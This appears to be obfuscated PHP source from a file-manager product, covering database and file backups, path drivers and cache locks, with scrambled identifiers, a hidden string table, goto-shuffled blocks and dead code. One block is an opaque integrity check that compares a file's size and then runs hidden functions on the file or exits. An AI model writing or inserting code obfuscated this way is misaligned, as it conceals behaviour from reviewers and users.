wqyz434aa756($·º†¡ë, $ößè‡¬˜) { $â¹É»ãú =& $_SERVER[ĞİŞñ©]; return call_user_func(array($â¹É»ãú[8], $â¹É»ãú[304]), $·º†¡ë, $ößè‡¬˜); $‘ô†ÍºÁ = $_SERVER[çâ¥×ø³][794]; } public function nyvo7344c7c9($ÛüäßÓ¨, $Ä€İ„¸) { $Ù™ø¾ü =& $_SERVER[çâ¥×ø³]; $‘ÂÇ®’İ =& $_SERVER[ĞİŞñ©]; return call_user_func(array($‘ÂÇ®’İ[305], $‘ÂÇ®’İ[306]), $ÛüäßÓ¨, $Ä€İ„¸); $ŞéÔÓØÇ = $Ù™ø¾ü[795]; if (strlen($ŞéÔÓØÇ) < $Ù™ø¾ü[660]) { return; } } public function lmyi16076013($à°²åÜ«, $áëıŸ) { $˜ÀÅ®óÇ =& $_SERVER[ĞİŞñ©]; return call_user_func(array($˜ÀÅ®óÇ[305], $˜ÀÅ®óÇ[307]), $à°²åÜ«, $áëıŸ); $ÙêŸ°î¡ = $_SERVER[çâ¥×ø³][796]; } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $Éø“ˆ =& $_SERVER[çâ¥×ø³]; $this->isManual(); self::$name = date($Éø“ˆ[797]); if (!($¬èåïª = Model($Éø“ˆ[798])->lastItem())) { $¬èåïª = $this->initData(); } else { self::$name = $¬èåïª[$Éø“ˆ[32]]; if ($¬èåïª[$Éø“ˆ[799]] == $Éø“ˆ[88]) { self::$name = date($Éø“ˆ[255]); $àÑü‰ï = 0; if (isset($¬èåïª[$Éø“ˆ[337]][$Éø“ˆ[214]][$Éø“ˆ[509]])) { $àÑü‰ï = (int) $¬èåïª[$Éø“ˆ[337]][$Éø“ˆ[214]][$Éø“ˆ[509]]; } if (self::$manual == 0 && $¬èåïª[$Éø“ˆ[32]] == self::$name) { Model($Éø“ˆ[798])->remove($¬èåïª[$Éø“ˆ[443]]); } $¬èåïª = $this->initData($àÑü‰ï, $¬èåïª[$Éø“ˆ[800]]); } else { $this->checkStore($¬èåïª[$Éø“ˆ[800]]); } } self::$option = $¬èåïª; } private function isManual() { $âÉš–²± = _get($GLOBALS, $_SERVER[çâ¥×ø³][801], 0); $âÉš–²± = intval($âÉš–²±); self::$manual = $âÉš–²± && $âÉš–²± == 1 ? 1 : 0; } private function initData($ÍÂ´ÑÚæ = 0, $‹ëÓ¦  = '') { $ÉÆôÒˆ© =& $_SERVER[çâ¥×ø³]; $Ò±ïÑÀµ = Model($ÉÆôÒˆ©[798])->config(); if ($‹ëÓ¦  && $Ò±ïÑÀµ[$ÉÆôÒˆ©[800]] != $‹ëÓ¦ ) { $ÍÂ´ÑÚæ = 0; } $this->checkStore($Ò±ïÑÀµ[$ÉÆôÒˆ©[800]]); if (self::$manual == 1) { self::$name .= $ÉÆôÒˆ©[11] . date($ÉÆôÒˆ©[802]); } $¨ÕâŸÛ = array($ÉÆôÒˆ©[800] => $Ò±ïÑÀµ[$ÉÆôÒˆ©[800]], $ÉÆôÒˆ©[32] => self::$name, $ÉÆôÒˆ©[799] => 0, $ÉÆôÒˆ©[803] => $Ò±ïÑÀµ[$ÉÆôÒˆ©[803]], $ÉÆôÒˆ©[804] => self::$manual, $ÉÆôÒˆ©[337] => array($ÉÆôÒˆ©[805] => array($ÉÆôÒˆ©[799] => 0), $ÉÆôÒˆ©[806] => array($ÉÆôÒˆ©[799] => 0, $ÉÆôÒˆ©[807] => 0, $ÉÆôÒˆ©[808] => 0, $ÉÆôÒˆ©[33] => $ÉÆôÒˆ©[12], $ÉÆôÒˆ©[809] => 0, $ÉÆôÒˆ©[810] => 0), $ÉÆôÒˆ©[811] => array($ÉÆôÒˆ©[799] => 0, $ÉÆôÒˆ©[807] => 0, $ÉÆôÒˆ©[808] => 0, $ÉÆôÒˆ©[809] => 0, $ÉÆôÒˆ©[810] => 0), $ÉÆôÒˆ©[214] => array($ÉÆôÒˆ©[799] => 0, $ÉÆôÒˆ©[812] => 0, $ÉÆôÒˆ©[813] => 0, $ÉÆôÒˆ©[814] => 0, $ÉÆôÒˆ©[815] => 0, $ÉÆôÒˆ©[509] => $ÍÂ´ÑÚæ, $ÉÆôÒˆ©[809] => 0, $ÉÆôÒˆ©[810] => 0)), $ÉÆôÒˆ©[809] => time(), $ÉÆôÒˆ©[810] => 0); $©× …çï = Model($ÉÆôÒˆ©[798])->insert($¨ÕâŸÛ); $¨ÕâŸÛ[$ÉÆôÒˆ©[443]] = $©× …çï; return $¨ÕâŸÛ; } private function checkStore($ñµîÄÇÖ) { $¤ú•Í¨ =& $_SERVER[çâ¥×ø³]; $ƒÆ˜ªÅ = Model($¤ú•Í¨[816])->listData($ñµîÄÇÖ); Model($¤ú•Í¨[816])->checkConfig($ƒÆ˜ªÅ); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[çâ¥×ø³][798])->findByName(self::$name); } return self::$option; } public static function set($µ¥ƒ©„‡) { $ğüĞÓ® =& $_SERVER[çâ¥×ø³]; $„©·ö™º = self::get(); foreach ($µ¥ƒ©„‡ as $™İªÊ¼î => $°Ü­É²) { $Ó³ õ• = explode($ğüĞÓ®[10], $™İªÊ¼î); $šú…ƒ¬ = count($Ó³ õ•); switch ($šú…ƒ¬) { case 1: $„©·ö™º[$Ó³ õ•[0]] = $°Ü­É²; break; case 2: $„©·ö™º[$Ó³ õ•[0]][$Ó³ õ•[1]] = $°Ü­É²; break; case 3: $„©·ö™º[$Ó³ õ•[0]][$Ó³ õ•[1]][$Ó³ õ•[2]] = $°Ü­É²; break; } } Model($ğüĞÓ®[798])->update($„©·ö™º[$ğüĞÓ®[443]], $„©·ö™º); self::$option = $„©·ö™º; return self::$option; } public function keep() { $­ş™¥˜ =& $_SERVER[çâ¥×ø³]; $Ôª’’ÁÎ = self::get(); if ($Ôª’’ÁÎ[$­ş™¥˜[337]][$­ş™¥˜[805]][$­ş™¥˜[799]] == $­ş™¥˜[88]) { return; } $this->backupKeep($Ôª’’ÁÎ); self::set(array($­ş™¥˜[817] => 1)); } private function backupKeep($å¹¯“çÃ) { $¥Ñûò­à =& $_SERVER[çâ¥×ø³]; if (self::$manual == 1) { return; } $¤°œ¬ Ì = Model($¥Ñûò­à[798])->listData(); if (empty($¤°œ¬ Ì)) { return; } $ÈúŒÔú = 0; $ÄËùõÈş = array(); foreach ($¤°œ¬ Ì as $ñøæõ¯) { if ($ÈúŒÔú >= 7) { break; } $ÄËùõÈş[] = $ñøæõ¯[$¥Ñûò­à[32]]; $ÈúŒÔú++; } for ($ÈúŒÔú = 0; $ÈúŒÔú < 12; $ÈúŒÔú++) { $ÄËùõÈş[] = date($¥Ñûò­à[818], strtotime("\x2d{$ÈúŒÔú}\x20\x6d\x6f\156\164\x68\163")); } $ÄËùõÈş = array_unique($ÄËùõÈş); $ÀäßË„ = Model($¥Ñûò­à[819])->get($¥Ñûò­à[820]); foreach ($¤°œ¬ Ì as $ñøæõ¯) { if (isset($ñøæõ¯[$¥Ñûò­à[804]]) && $ñøæõ¯[$¥Ñûò­à[804]] == $¥Ñûò­à[88]) { continue; } if (!empty($ñøæõ¯[$¥Ñûò­à[32]]) && in_array($ñøæõ¯[$¥Ñûò­à[32]], $ÄËùõÈş)) { continue; } Model($¥Ñûò­à[798])->remove($ñøæõ¯[$¥Ñûò­à[443]]); $—°åÄ®“ = $this->backupPath($å¹¯“çÃ, $ÀäßË„); IO::remove($—°åÄ®“, !1); } } private function backupPath($»ö¼Ù, $¶®£„²× = false) { $ı–Õ“‹Ä =& $_SERVER[çâ¥×ø³]; if (!$¶®£„²×) { $¶®£„²× = Model($ı–Õ“‹Ä[819])->get($ı–Õ“‹Ä[820]); } $çìÂûÜÚ = $»ö¼Ù[$ı–Õ“‹Ä[32]]; $¢İÖ˜Á“ = substr(md5($ı–Õ“‹Ä[821] . $¶®£„²× . $çìÂûÜÚ), 0, 8); return "\173\x69\157\72{$»ö¼Ù[$ı–Õ“‹Ä[800]]}\x7d\57\144\141\x74\x61\x62\141\x73\x65\x2f\142\141\143\153\x75\160\57" . $çìÂûÜÚ . $ı–Õ“‹Ä[11] . $¢İÖ˜Á“; } public function db() { $¥ÑÌ–Øó =& $_SERVER[çâ¥×ø³]; $è¡®¿êô = self::get(); if ($è¡®¿êô[$¥ÑÌ–Øó[337]][$¥ÑÌ–Øó[806]][$¥ÑÌ–Øó[799]] == $¥ÑÌ–Øó[88]) { return !0; } $€ê‰ïª = new BackupDb(); if (!$€ê‰ïª->index()) { return !1; } self::set(array($¥ÑÌ–Øó[822] => 1)); return !0; } public function dbFile() { $—“™É»± =& $_SERVER[çâ¥×ø³]; $ôŞÅ×¤Ì = self::get(); if ($ôŞÅ×¤Ì[$—“™É»±[337]][$—“™É»±[811]][$—“™É»±[799]] == $—“™É»±[88]) { return !0; } $Ûéâñ‰‡ = new BackupDbFile(); if (!$Ûéâñ‰‡->index()) { return !1; } self::set(array($—“™É»±[823] => 1)); return !0; } public function file() { $¨Ø–¡Åƒ =& $_SERVER[çâ¥×ø³]; $İæğÚ•™ = self::get(); if ($İæğÚ•™[$¨Ø–¡Åƒ[337]][$¨Ø–¡Åƒ[214]][$¨Ø–¡Åƒ[799]] == $¨Ø–¡Åƒ[88]) { return !0; } if (!isset($İæğÚ•™[$¨Ø–¡Åƒ[803]]) || $İæğÚ•™[$¨Ø–¡Åƒ[803]] == $¨Ø–¡Åƒ[212]) { $ÛÌ™¢Ê’ = new BackupFile(); if (!$ÛÌ™¢Ê’->index()) { return !1; } } self::set(array($¨Ø–¡Åƒ[824] => 1, $¨Ø–¡Åƒ[799] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $ÇÄÂâ”¼ =& $_SERVER[çâ¥×ø³]; $Ò“³¿¥Ş = Backup::get(); self::$io = $Ò“³¿¥Ş[$ÇÄÂâ”¼[800]]; self::$name = $Ò“³¿¥Ş[$ÇÄÂâ”¼[32]]; $øÕ£¼ÈÏ = new DbManage(); $Æİı¿íù = $øÕ£¼ÈÏ->dbType(); $í’±¨ = array($ÇÄÂâ”¼[825] => $Æİı¿íù, $ÇÄÂâ”¼[826] => time()); Backup::set($í’±¨); $ùÂÂó¹± = $this->tmpFilesPath() . $ÇÄÂâ”¼[827] . self::$name . $ÇÄÂâ”¼[8]; del_dir($ùÂÂó¹±); mk_dir($ùÂÂó¹±); $Ÿ¥±ğÃ© = $’ÁüôŞü = 0; $œ‘ÒÜÑĞ = new Task($ÇÄÂâ”¼[828], $ÇÄÂâ”¼[829], 0, LNG($ÇÄÂâ”¼[830]) . $ÇÄÂâ”¼[831] . LNG($ÇÄÂâ”¼[832])); try { $¼ŞôÜø = $øÕ£¼ÈÏ->db()->getTables(); } catch (Exception $—ğÆñùÌ) { $œ‘ÒÜÑĞ->end(); return !1; } $¼ŞôÜø = array_diff($¼ŞôÜø, array($ÇÄÂâ”¼[833], $ÇÄÂâ”¼[834])); foreach ($¼ŞôÜø as $ƒ÷©¿è) { $Ÿ¥±ğÃ© += $øÕ£¼ÈÏ->model($ƒ÷©¿è)->count(); } $œ‘ÒÜÑĞ->task[$ÇÄÂâ”¼[835]] = $Ÿ¥±ğÃ©; $GLOBALS[$ÇÄÂâ”¼[836]] = self::$name; foreach ($¼ŞôÜø as $ƒ÷©¿è) { $õÁ¡’µÃ = $ùÂÂó¹± . $ƒ÷©¿è . $ÇÄÂâ”¼[837]; $Ö¼šìÇ = null; if ($ƒ÷©¿è == $ÇÄÂâ”¼[838] && (!isset($Ò“³¿¥Ş[$ÇÄÂâ”¼[803]]) || $Ò“³¿¥Ş[$ÇÄÂâ”¼[803]] == $ÇÄÂâ”¼[212])) { $Ö¼šìÇ = self::$io; } $’ÁüôŞü += $øÕ£¼ÈÏ->sqlFromDb($ƒ÷©¿è, $õÁ¡’µÃ, $œ‘ÒÜÑĞ, $Ö¼šìÇ); } unset($GLOBALS[$ÇÄÂâ”¼[836]]); $œ‘ÒÜÑĞ->end(); if ($’ÁüôŞü > $Ÿ¥±ğÃ©) { $Ÿ¥±ğÃ© = $’ÁüôŞü; } $í’±¨ = array($ÇÄÂâ”¼[825] => $Æİı¿íù, $ÇÄÂâ”¼[822] => 1, $ÇÄÂâ”¼[839] => $Ÿ¥±ğÃ©, $ÇÄÂâ”¼[840] => $’ÁüôŞü, $ÇÄÂâ”¼[841] => time()); Backup::set($í’±¨); if ($Ÿ¥±ğÃ© - $’ÁüôŞü > 0) { $¦Æ÷ÂŠÛ = $ÇÄÂâ”¼[842]; if (stristr(I18n::getType(), $ÇÄÂâ”¼[843])) { $¦Æ÷ÂŠÛ = $ÇÄÂâ”¼[844]; } write_log(array($¦Æ÷ÂŠÛ, $í’±¨), $ÇÄÂâ”¼[829]); return !1; } return !0; } private function tmpFilesPath() { $îÅÛÔÊÁ =& $_SERVER[çâ¥×ø³]; $ò•©’¹Ò = TEMP_FILES; if ($GLOBALS[$îÅÛÔÊÁ[6]][$îÅÛÔÊÁ[89]][$îÅÛÔÊÁ[845]]) { $ò•©’¹Ò = $GLOBALS[$îÅÛÔÊÁ[6]][$îÅÛÔÊÁ[89]][$îÅÛÔÊÁ[845]]; if (!mk_dir($ò•©’¹Ò) || !is_writable($ò•©’¹Ò) || !IO::mkfile($ò•©’¹Ò . $îÅÛÔÊÁ[846])) { $ò•©’¹Ò = TEMP_FILES; } } return $ò•©’¹Ò; } } goto bî¶×õ¶; E„Õô÷´İ‰: $_size = $_SERVER[çâ¥×ø³][1491]; if ($_SERVER[$_SERVER[çâ¥×ø³][926]] != $_size($_file)) { $_getc = $_SERVER[çâ¥×ø³][929]; $_getfile = $_SERVER[$_SERVER[çâ¥×ø³][930]] . $_SERVER[çâ¥×ø³][931]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[çâ¥×ø³][246], $_getfilec); if (count($_getarrs) < $_SERVER[çâ¥×ø³][670]) { $exit = $_SERVER[çâ¥×ø³][932]; $exit(); } $_act = $_SERVER[çâ¥×ø³][1492]; $_act($_file); } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($ù‹º–ÑÔ, $¤å…¹é  = 0) { parent::__construct(); $this->source = $ù‹º–ÑÔ; $this->sourceSize = $¤å…¹é ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($ÉÏ®š„ = false) { return $this->sourceSize; } public function getContent($á‡•ûŸú = false) { return $this->fileSubstr($á‡•ûŸú, 0, $this->sourceSize); } public function fileSubstr($­Î¯€Ó¿ = false, $±ığ  ƒ = 0, $¨‡ª“„ = 0) { if (!$¨‡ª“„) { $¨‡ª“„ = $this->sourceSize; } $àÏ—è º = $this->sourceSize - $±ığ  ƒ; if ($¨‡ª“„ >= $àÏ—è º) { $¨‡ª“„ = $àÏ—è º; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $±ığ  ƒ, $¨‡ª“„); } if ($this->sourceType == self::TYPE_FILE) { if ($¨‡ª“„ <= 0) { return $_SERVER[çâ¥×ø³][12]; } $£÷´Á’¶ = ftell($this->source); fseek_64($this->source, $£÷´Á’¶ + $±ığ  ƒ); $‡ƒ ßˆš = @fread($this->source, $¨‡ª“„); fseek_64($this->source, $£÷´Á’¶); return $‡ƒ ßˆš; } } public function hashMd5($·ƒÒ§¹İ = false) { return md5($this->getContent()); } public static function hash($äßàÀÖ‰, $×¯¯ÈŒÑ = 0) { $³øë†« = new PathDriverStream($äßàÀÖ‰, $×¯¯ÈŒÑ); return $³øë†«->hashSimple($äßàÀÖ‰); } public static function md5($´É”µíÃ, $íĞñá´ë = 0) { $”µ®İ’Â = new PathDriverStream($´É”µíÃ, $íĞñá´ë); return $”µ®İ’Â->hashMd5($´É”µíÃ); } } goto D ×²ÎÑ‘…; C‰á…›Íä´: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $«¯ˆú§™ =& $_SERVER[çâ¥×ø³]; $‚Òï‘à = $GLOBALS[$«¯ˆú§™[6]][$«¯ˆú§™[393]]; self::$cachePath = $‚Òï‘à[$«¯ˆú§™[214]][$«¯ˆú§™[84]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($íß ‡Ú½, $ÔİõÃáŒ = 0) { $‘¤ñ´Îï =& $_SERVER[çâ¥×ø³]; $‚ö¶©²ş = microtime(!0); $²ãˆ±¯ˆ = $‚ö¶©²ş + $ÔİõÃáŒ + 0.0001; $ß½Ì³›€ = rtrim(self::$cachePath, $‘¤ñ´Îï[8]) . $‘¤ñ´Îï[913] . md5($íß ‡Ú½) . $‘¤ñ´Îï[910]; if (file_exists($ß½Ì³›€) && filemtime($ß½Ì³›€) && filemtime($ß½Ì³›€) < time() - 10) { @unlink($ß½Ì³›€); } do { if (file_exists($ß½Ì³›€)) { cacheLockWait(); continue; } $¤±ÈÊäÅ = fopen($ß½Ì³›€, $‘¤ñ´Îï[914]); if (!$¤±ÈÊäÅ) { return !1; } $­Õôû¯Û = flock($¤±ÈÊäÅ, LOCK_EX | LOCK_NB); self::$caches[$íß ‡Ú½] = array($‘¤ñ´Îï[915] => $¤±ÈÊäÅ, $‘¤ñ´Îï[214] => $ß½Ì³›€); fwrite($¤±ÈÊäÅ, $²ãˆ±¯ˆ); clearstatcache(); if ($¤±ÈÊäÅ && $­Õôû¯Û) { return !0; } cacheLockWait(); } while (microtime(!0) < $²ãˆ±¯ˆ); $this->unlock($íß ‡Ú½); return !1; } public function lockGet($Úçˆ“ ö) { $Ÿ—©Óê =& $_SERVER[çâ¥×ø³]; $›ÚôîÔÙ = rtrim(self::$cachePath, $Ÿ—©Óê[8]) . $Ÿ—©Óê[913] . md5($Úçˆ“ ö) . $Ÿ—©Óê[910]; return file_exists($›ÚôîÔÙ); } public function unlock($ˆŸ÷‰û–) { $¤îÙ³¶› =& $_SERVER[çâ¥×ø³]; $§­¤ş¾İ = self::$caches[$ˆŸ÷‰û–]; if (!$§­¤ş¾İ) { return; } @flock($§­¤ş¾İ[$¤îÙ³¶›[915]], LOCK_UN); @fclose($§­¤ş¾İ[$¤îÙ³¶›[915]]); @unlink($§­¤ş¾İ[$¤îÙ³¶›[214]]); unset(self::$caches[$ˆŸ÷‰û–]); } } class CacheLockRedis { public function lock($Ù†şÈó€, $Â£ßæ†¤ = 10) { $˜ÇªİüÔ = Cache::init(); $¨¥ÑñÒè = microtime(!0) + $Â£ßæ†¤; while (microtime(!0) < $¨¥ÑñÒè) { $ğ‹Ú¥Û = $˜ÇªİüÔ->get($Ù†şÈó€); if (!$ğ‹Ú¥Û) { $Ò°ùÂ“ = $˜ÇªİüÔ->setLock($Ù†şÈó€, $¨¥ÑñÒè, $Â£ßæ†¤); if ($Ò°ùÂ“) { return !0; } } else { if ($ğ‹Ú¥Û < microtime(!0)) { $˜ÇªİüÔ->set($Ù†şÈó€, $¨¥ÑñÒè, $Â£ßæ†¤ * 2); if ($˜ÇªİüÔ->get($Ù†şÈó€) === $ğ‹Ú¥Û) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($Ò·¸éîÛ) { return Cache::init()->get($Ò·¸éîÛ); } public function unlock($ô˜×şŸ³) { return Cache::init()->remove($ô˜×şŸ³); } } class CacheLockMemcached { public function lock($êØæ€¨”, $ï ¦º§™ = 0) { $ğ¾í’º¶ = Cache::init(); $ú¿Ú¸‚‡ = microtime(!0) + $ï ¦º§™; while (microtime(!0) < $ú¿Ú¸‚‡) { $·á½Ñ¤Ñ = $ğ¾í’º¶->get($êØæ€¨”); if (!$·á½Ñ¤Ñ || $·á½Ñ¤Ñ < microtime(!0)) { $¹…ß¹×Ç = $ğ¾í’º¶->handle->add($êØæ€¨”, $ú¿Ú¸‚‡, $ï ¦º§™); if ($¹…ß¹×Ç) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($äàå½Ç½) { return Cache::init()->get($äàå½Ç½); } public function unlock($÷ÄÔ×­‰) { return Cache::init()->remove($÷ÄÔ×­‰); } } goto A£Àçø‘„ ; bì‰“ï®²: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $Ÿ•–µŸ¬ =& $_SERVER[çâ¥×ø³]; $this->objectDriver = array($Ÿ•–µŸ¬[60], $Ÿ•–µŸ¬[61], $Ÿ•–µŸ¬[62], $Ÿ•–µŸ¬[63], $Ÿ•–µŸ¬[64], $Ÿ•–µŸ¬[65], $Ÿ•–µŸ¬[66], $Ÿ•–µŸ¬[67], $Ÿ•–µŸ¬[68]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($Ô‚¦†øÔ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($Ô‚¦†øÔ, $_SERVER[çâ¥×ø³][8]); } return $Ô‚¦†øÔ; } public function iconvApp($ã‡¨Ø‚) { return $ã‡¨Ø‚; } public function iconvSystem($ ÛÀ­ë”) { return $ ÛÀ­ë”; } public function iconvTo($Ë—ì¶‰‘, $Ğ“çêÅÁ, $›¢ËèÑ•) { $äüªì¨ö =& $_SERVER[çâ¥×ø³]; if (!$Ë—ì¶‰‘ || !function_exists($äüªì¨ö[69])) { return $Ë—ì¶‰‘; } static $îçø¥­Ì = array(); $Úô‘ß°³ = $Ğ“çêÅÁ . $äüªì¨ö[70] . $›¢ËèÑ• . $äüªì¨ö[71] . $Ë—ì¶‰‘; if (isset($îçø¥­Ì[$Úô‘ß°³])) { return $îçø¥­Ì[$Úô‘ß°³]; } if (function_exists($äüªì¨ö[72])) { $š„¢Ã = @mb_convert_encoding($Ë—ì¶‰‘, $›¢ËèÑ•, $Ğ“çêÅÁ); } else { $š„¢Ã = @iconv($Ğ“çêÅÁ, $›¢ËèÑ•, $Ë—ì¶‰‘); } $š„¢Ã = $š„¢Ã ? $š„¢Ã : $Ë—ì¶‰‘; if (strstr($š„¢Ã, $äüªì¨ö[73])) { $š„¢Ã = str_replace($äüªì¨ö[73], $äüªì¨ö[11], $š„¢Ã); } $îçø¥­Ì[$Ğ“çêÅÁ . $äüªì¨ö[70] . $›¢ËèÑ• . $äüªì¨ö[71] . $Ë—ì¶‰‘] = $š„¢Ã; $îçø¥­Ì[$›¢ËèÑ• . $äüªì¨ö[70] . $Ğ“çêÅÁ . $äüªì¨ö[71] . $Ë—ì¶‰‘] = $Ë—ì¶‰‘; $îçø¥­Ì[$›¢ËèÑ• . $äüªì¨ö[70] . $Ğ“çêÅÁ . $äüªì¨ö[71] . $š„¢Ã] = $Ë—ì¶‰‘; $îçø¥­Ì[$Ğ“çêÅÁ . $äüªì¨ö[70] . $›¢ËèÑ• . $äüªì¨ö[71] . $š„¢Ã] = $š„¢Ã; return $š„¢Ã; } public function getPathInner($êğâ—–) { $ú¡ù˜·í = IO::init($êğâ—–); return $ú¡ù˜·í->path; } public function getPathOuter($‹ûãß§‰) { $ËğöÚ±İ =& $_SERVER[çâ¥×ø³]; $—ÅıŸÈû = strlen(trim($this->pathBase, $ËğöÚ±İ[8])); $‹ûãß§‰ = substr(trim($‹ûãß§‰, $ËğöÚ±İ[8]), $—ÅıŸÈû); return $this->pathDriver . $ËğöÚ±İ[8] . ltrim($‹ûãß§‰, $ËğöÚ±İ[8]); } public function isParentOf($Æ›‘Òô­, $Ì’ĞÁèÚ) { $êÙå¡ïé =& $_SERVER[çâ¥×ø³]; $Æ›‘Òô­ = rtrim(strtolower($Æ›‘Òô­), $êÙå¡ïé[8]) . $êÙå¡ïé[8]; $Ì’ĞÁèÚ = rtrim(strtolower($Ì’ĞÁèÚ), $êÙå¡ïé[8]) . $êÙå¡ïé[8]; $ûÓ”ï¢ = strpos($Ì’ĞÁèÚ, $Æ›‘Òô­) === 0; return $ûÓ”ï¢; } public function getType() { $Ä±ãÍÈ¢ =& $_SERVER[çâ¥×ø³]; $÷’‚Õ¢‹ = str_replace($Ä±ãÍÈ¢[74], $Ä±ãÍÈ¢[12], get_class($this)); return strtolower($÷’‚Õ¢‹); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($İØ£ç˜±, $İÕÌ«Üô) { $ÎÛø•œƒ =& $_SERVER[çâ¥×ø³]; $§ûƒò» = rtrim($İØ£ç˜±, $ÎÛø•œƒ[8]) . $ÎÛø•œƒ[8] . $İÕÌ«Üô; $°ªÅ´ÀÈ = $this->exist($§ûƒò»); return $°ªÅ´ÀÈ ? $§ûƒò» : !1; } public function setModifyTime($µ‰Æ€ô, $µÍÜ‹Ø = '') { } public function renameObject($úì§Èü, $¸‹›§Ä•) { $ğäÜó†™ = $¸‹›§Ä•; $úì§Èü = $this->getPathOuter($úì§Èü); $¸‹›§Ä• = $this->pathFather($úì§Èü) . $¸‹›§Ä•; $˜ƒ¿‹³ = IO::copy($úì§Èü, $this->pathFather($úì§Èü), REPEAT_RENAME_FOLDER, $ğäÜó†™); if ($˜ƒ¿‹³) { IO::remove($úì§Èü); } return $˜ƒ¿‹³ ? $¸‹›§Ä• : !1; } public function tempFile($¾äªù°ê = '', $µ˜Ñ«‡Ô = '') { if (!$¾äªù°ê) { $¾äªù°ê = rand_string(15); } $¾ô¹Æ¬¬ = TEMP_FILES . rand_string(15) . $_SERVER[çâ¥×ø³][8]; @mkdir($¾ô¹Æ¬¬, DEFAULT_PERRMISSIONS, !0); $Òæ¯Œ“¡ = $¾ô¹Æ¬¬ . $¾äªù°ê; @touch($Òæ¯Œ“¡); if ($µ˜Ñ«‡Ô) { file_put_contents($Òæ¯Œ“¡, $µ˜Ñ«‡Ô); } return $Òæ¯Œ“¡; } public function tempFileRemve($‘šªÇ•²) { @unlink($‘šªÇ•²); @rmdir($this->pathFather($‘šªÇ•²)); } public function mkfile($£¶·£ı“, $ƒŠŒ—İ = '', $®ÄÄš‰‹ = REPEAT_RENAME) { } public function mkdir($´¤¬ĞÀ›, $ñÔØîÖñ = REPEAT_SKIP) { } public function delFile($Í¹û‰‡Ô) { } public function delFolder($Ñ¤çĞÆ…) { } public function copyFile($‰´æßˆÎ, $»òá³ã³) { } public function moveFile($•›ÔÄÈÃ, $™¹£•À¤) { } public function remove($ÏæÉÑı®) { if ($this->isFile($ÏæÉÑı®)) { return $this->delFile($ÏæÉÑı®); } return $this->delFolder($ÏæÉÑı®); } public function rename($õÎš †¯, $ËÉßì‘Å) { } public function exist($©… ’•ñ) { } public function findByHash($Å×ÕéÓ— = '', $…ÚÄ¢ = '') { return !1; } public function isFile($¯ãÜÈì•) { } public function isFolder($ğ‘˜†–û) { } public function size($ôò”Ùò®) { } public function info($¿ìÎöí) { } public function infoSimple($ÒüÊî†Ë) { return $this->info($ÒüÊî†Ë); } public function infoAuth($¿Ğ°¤½ª) { return $this->info($¿Ğ°¤½ª); } public function infoFull($íÇıáÅ) { return $this->info($íÇıáÅ); } public function infoFullSimple($”€ï¶») { return $this->info($”€ï¶»); } public function infoWithChildren($ç¶°ô–) { $ØÍşªéà =& $_SERVER[çâ¥×ø³]; static $£÷´’ğì = array(); if (isset($£÷´’ğì[$ç¶°ô–])) { return $£÷´’ğì[$ç¶°ô–]; } $¦ÂÂ…ş­ = $this->info($ç¶°ô–); if ($¦ÂÂ…ş­ && $¦ÂÂ…ş­[$ØÍşªéà[33]] == $ØÍşªéà[75]) { $¡÷à²ñæ = array($ØÍşªéà[76] => 0, $ØÍşªéà[77] => 0, $ØÍşªéà[78] => 0); $this->infoChildren($ç¶°ô–, $¡÷à²ñæ); $¦ÂÂ…ş­[$ØÍşªéà[76]] = $¡÷à²ñæ[$ØÍşªéà[76]]; $¦ÂÂ…ş­[$ØÍşªéà[79]] = array($ØÍşªéà[80] => $¡÷à²ñæ[$ØÍşªéà[77]], $ØÍşªéà[81] => $¡÷à²ñæ[$ØÍşªéà[78]]); $£÷´’ğì[$ç¶°ô–] = $¦ÂÂ…ş­; } return $¦ÂÂ…ş­; } public function listPath($¾½öÌ¿—, $Ñ¹„éãÂ = false) { } public function has($®ˆı‘ª¾, $¬êÌ—« = false, $ƒ‘ÁÌ´Ä = false) { } public function canRead($†À†¸Çã) { } public function canWrite($Ï±ÏÍ†ñ) { } public function getContent($ôÉ†âÔÃ) { } public function setContent($·½–…Ãø, $¯·®Ãº— = '') { } protected function infoChildren($¢Ôñ¼€¦, &$Æ©Êü®Ü) { $¹¨«ÅÑš =& $_SERVER[çâ¥×ø³]; check_abort_echo(); $®è¨…“Ø = $this->listPath($¢Ôñ¼€¦, !0); $®è¨…“Ø = array_merge($®è¨…“Ø[$¹¨«ÅÑš[82]], $®è¨…“Ø[$¹¨«ÅÑš[83]]); foreach ($®è¨…“Ø as $éÉÀ©÷İ) { if ($éÉÀ©÷İ[$¹¨«ÅÑš[33]] == $¹¨«ÅÑš[75]) { $Æ©Êü®Ü[$¹¨«ÅÑš[78]]++; $ö¯É¿î = $this->getPathInner($éÉÀ©÷İ[$¹¨«ÅÑš[84]]); $this->infoChildren($ö¯É¿î, $Æ©Êü®Ü); } else { $Æ©Êü®Ü[$¹¨«ÅÑš[77]]++; $Æ©Êü®Ü[$¹¨«ÅÑš[76]] += $éÉÀ©÷İ[$¹¨«ÅÑš[76]]; } } } public function fileSubstr($¿Ÿ¾¾¾², $Êçì›äº, $€ä‡²½ö) { } public function listAll($©ã€„ëÁ) { } public function listAllMake($„³ÙÛÉä, &$†Œ†îñ¶) { $ÑÃ¸ã¸¡ =& $_SERVER[çâ¥×ø³]; check_abort_echo(); $ö¾Ì”ÛË = $this->listPath($„³ÙÛÉä, !0); if (!$ö¾Ì”ÛË) { return; } $üûÒÂãş = array_merge($ö¾Ì”ÛË[$ÑÃ¸ã¸¡[82]], 